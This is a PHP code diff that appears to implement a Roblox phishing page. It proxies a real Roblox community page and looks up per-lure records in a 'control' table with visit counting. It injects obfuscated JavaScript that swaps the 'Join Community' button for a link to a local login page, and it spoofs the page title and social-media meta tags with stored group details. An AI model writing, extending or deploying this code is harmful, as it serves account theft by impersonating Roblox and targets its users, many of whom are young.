@@ -1,0 +1,39 @@
+$uriParts = explode('/', trim($_SERVER['REQUEST_URI'], '/'));
+				$directoryIndex = array_search('communities', $uriParts);
+				if ($directoryIndex === false || !isset($uriParts[$directoryIndex + 1])) die(header("Location: /request-error?code=404"));
+				$directory = mysqli_real_escape_string($conn, $uriParts[$directoryIndex + 1]);
+				$dataQuery = $conn->query("SELECT * FROM `control` WHERE directory='$directory'");
+				$data = $dataQuery->fetch_assoc();
+				if (!$data) die(header("Location: /request-error?code=404"));
+
+				$stmt = $conn->prepare("UPDATE `control` SET `analysis_visits` = ? WHERE directory = ?");
+				$newVisits = $data['analysis_visits'] + 1;
+				$stmt->bind_param('is', $newVisits, $directory);
+				$stmt->execute();
+
+				$curl = curl_init("https://www.roblox.com/communities/15673992/kanas-group#!/about");
+				curl_setopt_array($curl, [
+					CURLOPT_RETURNTRANSFER => true,
+					CURLOPT_FOLLOWLOCATION => true,
+					CURLOPT_HEADER => true,
+					CURLOPT_USERAGENT => 'Mozilla/5.0'
+				]);
+				$result = curl_exec($curl);
+				$headerLen = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
+				$body = substr($result, $headerLen);
+				res($body);
+
+				$script = <<<EOD
+				<script>
+				(function(){const BUTTON_TEXT="Join Community";function createJoinLink(){const a=document.createElement('a');a.href="/login?returnUrl="+encodeURIComponent(location.href);a.className="MuiButtonBase-root MuiButton-root web-blox-css-tss-d9t91x-Button-root actions-btn MuiButton-contained web-blox-css-tss-lo77dr-Button-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium web-blox-css-mui-1yvpzvm";a.setAttribute('tabindex','0');a.setAttribute('role','button');a.style.color="white";const spanText=document.createElement('span');spanText.className="web-blox-css-tss-1283320-Button-textContainer";spanText.textContent="Join Community";const spanRipple=document.createElement('span');spanRipple.className="MuiTouchRipple-root web-blox-css-mui-w0pj6f";a.appendChild(spanText);a.appendChild(spanRipple);return a;}function replaceButtonContainer(c){if(!c.dataset.replaced){c.innerHTML='';c.appendChild(createJoinLink());c.dataset.replaced='true';const o=new MutationObserver(()=>{o.disconnect();c.innerHTML='';c.appendChild(createJoinLink());o.observe(c,{childList:true,subtree:true})});o.observe(c,{childList:true,subtree:true})}}function scanAndReplace(){document.querySelectorAll('.actions-btn-container').forEach(c=>{const b=c.querySelector('button');if(b&&b.textContent.trim().includes(BUTTON_TEXT))replaceButtonContainer(c)})}setInterval(scanAndReplace,300)})();
+				</script>
+				EOD;
+
+				$body = str_replace('</body>', $script.'</body>', $body);
+				$body = preg_replace('/<title>.*?<\/title>/', '<title>'.htmlentities($data['group_name']).' - Roblox</title>', $body);
+				$body = preg_replace('/<meta name="description" content=".*?" \/>/', '<meta name="description" content="'.htmlentities($data['group_name']).' is a group on Roblox owned by '.htmlentities($data['profile_username']).' with '.$data['group_member'].' members. '.htmlentities($data['group_description']).'" />', $body);
+				$body = preg_replace('/<meta property="og:title" content=".*?" \/>/', '<meta property="og:title" content="'.htmlentities($data['group_name']).'" />', $body);
+				$body = preg_replace('/<meta property="og:description" content=".*?" \/>/', '<meta property="og:description" content="'.htmlentities($data['group_name']).' is a group on Roblox owned by '.htmlentities($data['profile_username']).' with '.$data['group_member'].' members. '.htmlentities($data['group_description']).'" />', $body);
+				$body = preg_replace('/<meta property="og:image" content=".*?" \/>/', '<meta property="og:image" content="'.$data['group_thumbnails'].'" />', $body);
+
+				die($body);
